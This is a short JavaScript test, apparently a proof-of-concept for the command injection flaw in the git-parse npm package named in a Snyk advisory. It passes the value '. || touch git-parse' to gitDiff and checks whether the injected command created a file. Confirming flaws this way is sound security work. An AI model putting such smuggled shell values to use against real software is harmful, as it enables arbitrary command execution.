//https://snyk.io/vuln/SNYK-JS-GITPARSE-1290380
test("Command Injection in git-parse", () => {
  const x = require("git-parse");
  const fs = require("fs");
  const path = "./git-parse";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  const paths = ". || touch git-parse";
  x.gitDiff(".", 445454, 1545, paths).finally(() => {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
